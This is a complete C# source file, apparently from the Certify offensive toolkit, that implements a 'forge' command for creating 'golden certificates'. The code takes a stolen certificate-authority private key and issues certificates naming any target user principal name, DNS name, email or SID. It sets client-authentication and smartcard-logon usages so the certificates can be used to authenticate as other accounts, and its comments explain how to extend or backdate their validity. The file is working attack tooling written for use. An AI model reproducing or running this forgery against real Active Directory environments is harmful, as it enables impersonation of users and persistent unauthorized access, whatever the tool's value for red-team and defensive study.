using Org.BouncyCastle.Asn1.Pkcs;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Asn1.X9;
using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Utilities;
using Org.BouncyCastle.X509;
using System;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using Certify.Lib;
using Certify.Domain;
using System.Collections.Generic;
using CommandLine;

#if !DISARMED

namespace Certify.Commands
{
    internal class CertForge
    {
        [Verb("forge", HelpText = "Create a 'golden certificate' using stolen CA keys")]
        public class Options : DefaultOptions
        {
            [Option("ca-cert", Required = true, HelpText = "The CA private key in PFX or P12 format")]
            public string CaCertificate { get; set; }

            [Option("ca-pass", HelpText = "Password for CA private key")]
            public string CaCertificatePassword { get; set; }

            [Option("output-path", HelpText = "Path to output certificate")]
            public string OutputCertificatePath { get; set; }

            [Option("output-pass", HelpText = "Password for output certificate")]
            public string OutputCertificatePassword { get; set; }

            [Option("subject", Default = "CN=User", HelpText = "Target subject name")]
            public string SubjectName { get; set; }

            [Option("upn", Group = "SAN", HelpText = "Target subject alternative name (UPN)")]
            public IEnumerable<string> SubjectAltNameUpn { get; set; }

            [Option("dns", Group = "SAN", HelpText = "Target subject alternative name (DNS)")]
            public IEnumerable<string> SubjectAltNameDns { get; set; }

            [Option("email", Group = "SAN", HelpText = "Target subject alternative name (Email)")]
            public IEnumerable<string> SubjectAltNameEmail { get; set; }

            [Option("sid", HelpText = "Target subject alternative SID")]
            public string SubjectAltNameSid { get; set; }

            [Option("crl", HelpText = "LDAP path to a CRL for certificate")]
            public string CrlPath { get; set; }

            [Option("serial", HelpText = "Hardcoded serial number for certificate")]
            public string SerialNumber { get; set; }
        }

        public static int Execute(Options opts)
        {
            Console.WriteLine("[*] Action: Forge a (golden) certificate");

            if (!string.IsNullOrEmpty(opts.OutputCertificatePath) && string.IsNullOrEmpty(opts.OutputCertificatePassword))
            {
                Console.WriteLine("[X] An output certificate password is required when saving to disk.");
                return 1;
            }

            byte[] ca_cert_bytes = null;

            if (!string.IsNullOrEmpty(opts.CaCertificate) && !File.Exists(opts.CaCertificate))
            {
                try
                {
                    ca_cert_bytes = Convert.FromBase64String(opts.CaCertificate);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[X] Failed to decode CA certificate parameter: {e.Message}");
                    return 1;
                }
            }

            var serial_number = BigInteger.Zero;

            if (!string.IsNullOrEmpty(opts.SerialNumber))
            {
                try
                {
                    serial_number = new BigInteger(opts.SerialNumber);
                }
                catch (Exception)
                {
                    Console.WriteLine("[X] The 'serial number' parameter is not of the format '<serial number>'.");
                    return 1;
                }
            }

            if (opts.SubjectAltNameSid == null)
            {
                Console.WriteLine("[!] No subject alternative security identifier (SID) has been provided.");
                Console.WriteLine("[!] - Authentication may fail if strong certificate binding is enforced.");
            }

            var sans = new List<Tuple<SubjectAltNameType, string>>();

            void AddSubjectAltNames(IEnumerable<string> names, SubjectAltNameType type)
            {
                foreach (var x in names)
                    sans.Add(new Tuple<SubjectAltNameType, string>(type, x));
            }

            AddSubjectAltNames(opts.SubjectAltNameUpn, SubjectAltNameType.Upn);
            AddSubjectAltNames(opts.SubjectAltNameDns, SubjectAltNameType.Dns);
            AddSubjectAltNames(opts.SubjectAltNameEmail, SubjectAltNameType.Email);

            Tuple<Org.BouncyCastle.X509.X509Certificate, AsymmetricKeyParameter> ca_key_pair = null;

            if (ca_cert_bytes != null)
                ca_key_pair = CertTransformUtil.SplitPfx(ca_cert_bytes, opts.CaCertificatePassword);
            else
                ca_key_pair = CertTransformUtil.SplitPfx(opts.CaCertificate, opts.CaCertificatePassword);

            if (ca_key_pair != null)
            {
                Console.WriteLine();
                Console.WriteLine("CA Certificate Information:");
                PrintCertificateInfo(ca_key_pair.Item1);

                var subject_key_pair = GenerateRsaKeyPair(2048);
                var certificate = GenerateCertificate(opts, ca_key_pair.Item1.SubjectDN, sans, ca_key_pair, subject_key_pair.Public, serial_number);

                Console.WriteLine();
                Console.WriteLine("Forged Certificate Information:");
                PrintCertificateInfo(certificate);

                var pfx = CertTransformUtil.MakePfx(opts.OutputCertificatePassword, certificate, subject_key_pair.Private);

                if (string.IsNullOrEmpty(opts.OutputCertificatePath))
                {
                    Console.WriteLine();
                    Console.WriteLine("Forged certificate (PFX):");
                    Console.WriteLine();
                    Console.WriteLine(Convert.ToBase64String(pfx));
                }
                else
                {
                    try
                    {
                        File.WriteAllBytes(opts.OutputCertificatePath, pfx);

                        Console.WriteLine();
                        Console.WriteLine($"Saved forged certificate to '{opts.OutputCertificatePath}' with the password '{opts.OutputCertificatePassword}'.");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[X] Failed to save certificate to path '{opts.OutputCertificatePath}' with error: {e.Message}.");
                    }
                }
            }

            return 0;
        }

        private static readonly SecureRandom Random = new SecureRandom();

        private static AsymmetricCipherKeyPair GenerateRsaKeyPair(int length)
        {
            var key_gen = new RsaKeyPairGenerator();
            key_gen.Init(new KeyGenerationParameters(Random, length));
            return key_gen.GenerateKeyPair();
        }

        private static Org.BouncyCastle.X509.X509Certificate GenerateCertificate(Options opts, X509Name issuer, List<Tuple<SubjectAltNameType, string>> sans,
            Tuple<Org.BouncyCastle.X509.X509Certificate, AsymmetricKeyParameter> issuer_key_pair, AsymmetricKeyParameter subject_pub_key, BigInteger serial_number)
        {
            ISignatureFactory signature_factory;

            if (issuer_key_pair.Item2 is ECPrivateKeyParameters)
                signature_factory = new Asn1SignatureFactory(X9ObjectIdentifiers.ECDsaWithSha256.ToString(), issuer_key_pair.Item2);
            else
                signature_factory = new Asn1SignatureFactory(PkcsObjectIdentifiers.Sha256WithRsaEncryption.ToString(), issuer_key_pair.Item2);

            var cert_gen = new X509V3CertificateGenerator();
            cert_gen.SetIssuerDN(issuer);
            cert_gen.SetSubjectDN(new X509Name(opts.SubjectName));

            if (serial_number == null || serial_number == BigInteger.Zero)
                cert_gen.SetSerialNumber(BigIntegers.CreateRandomInRange(BigInteger.One, BigInteger.Two.Pow(128), Random));
            else
                cert_gen.SetSerialNumber(serial_number);

            // Yes, the end lifetime can be changed easily, up to the lifetime of the CA certificate being used to forge
            cert_gen.SetNotAfter(DateTime.UtcNow.AddYears(1));

            // this can be changed as well to backdate
            cert_gen.SetNotBefore(DateTime.UtcNow);
            cert_gen.SetPublicKey(subject_pub_key);

            // Sometimes explicit EKUs must be defined to allow client authentication
            cert_gen.AddExtension(X509Extensions.KeyUsage, true, new KeyUsage(X509KeyUsage.DigitalSignature | X509KeyUsage.KeyEncipherment));
            cert_gen.AddExtension(X509Extensions.ExtendedKeyUsage, false, new ExtendedKeyUsage(new DerSequence(
                new DerObjectIdentifier(CommonOids.AnyPurpose),
                new DerObjectIdentifier(CommonOids.ClientAuthentication),
                new DerObjectIdentifier(CommonOids.PKINITClientAuthentication),
                new DerObjectIdentifier(CommonOids.SmartcardLogon),
                new DerObjectIdentifier(CommonOids.CertificateRequestAgent)
            )));

            // Subject Alternative Name - this is the targets we're actually forging the cert for
            var general_names = new Asn1EncodableVector();

            foreach (var san in sans)
            {
                switch (san.Item1)
                {
                    case SubjectAltNameType.Upn:
                        general_names.Add(new DerTaggedObject(false, 0, new DerSequence(new Asn1EncodableVector
                        {
                            new DerObjectIdentifier(CommonOids.UserPrincipalName),
                            new DerTaggedObject(true, GeneralName.OtherName, new DerUtf8String(san.Item2))
                        })));
                        break;

                    case SubjectAltNameType.Dns:
                        general_names.Add(new GeneralName(GeneralName.DnsName, san.Item2));
                        break;

                    case SubjectAltNameType.Email:
                        general_names.Add(new GeneralName(GeneralName.Rfc822Name, san.Item2));
                        break;

                    case SubjectAltNameType.Url:
                        general_names.Add(new GeneralName(GeneralName.UniformResourceIdentifier, san.Item2));
                        break;

                    default:
                        Console.WriteLine($"[!] Unknown subject alternative name type for '{san.Item2}'.");
                        break;
                }
            }

            cert_gen.AddExtension(X509Extensions.SubjectAlternativeName, false, new DerSequence(general_names));

            // SID Extension - required if strong certificate mapping is enforced
            if (!string.IsNullOrEmpty(opts.SubjectAltNameSid))
                cert_gen.AddExtension(CommonOids.NtdsCaSecurityExt, false, Asn1Object.FromByteArray(CertSidExtension.EncodeSidExtension(opts.SubjectAltNameSid)));
            
            // Authority Key Identifier - required
            cert_gen.AddExtension(X509Extensions.AuthorityKeyIdentifier, false, new AuthorityKeyIdentifier(
                SubjectPublicKeyInfoFactory.CreateSubjectPublicKeyInfo(issuer_key_pair.Item1.GetPublicKey())));

            // A CRL is required for chain verification when using a subordinate CA certificate
            if (!string.IsNullOrEmpty(opts.CrlPath))
            {
                // CRL Distribution Points
                var crl_dist_points = new DistributionPoint[1] {
                    new DistributionPoint(new DistributionPointName(new GeneralNames(new GeneralName(GeneralName.UniformResourceIdentifier, opts.CrlPath))), null, null),
                };

                cert_gen.AddExtension(X509Extensions.CrlDistributionPoints, false, new CrlDistPoint(crl_dist_points));
            }

            return cert_gen.Generate(signature_factory);
        }

        private static void PrintCertificateInfo(Org.BouncyCastle.X509.X509Certificate cert)
        {
            var cert2 = new X509Certificate2(cert.GetEncoded());

            Console.WriteLine($"  Subject:        {cert2.Subject}");

            var upn = cert2.GetNameInfo(X509NameType.UpnName, false);

            if (!string.IsNullOrEmpty(upn))
                Console.WriteLine($"  SubjectAltName: {upn}");

            var dns = cert2.GetNameInfo(X509NameType.DnsFromAlternativeName, false);

            if (!string.IsNullOrEmpty(dns))
                Console.WriteLine($"  SubjectAltName: {dns}");

            var email = cert2.GetNameInfo(X509NameType.EmailName, false);

            if (!string.IsNullOrEmpty(email))
                Console.WriteLine($"  SubjectAltName: {email}");

            Console.WriteLine($"  Issuer:         {cert2.Issuer}");
            Console.WriteLine($"  Start Date:     {cert2.NotBefore}");
            Console.WriteLine($"  End Date:       {cert2.NotAfter}");
            Console.WriteLine($"  Thumbprint:     {cert2.Thumbprint}");
            Console.WriteLine($"  Serial:         {cert2.SerialNumber}");
        }
    }
}

#endif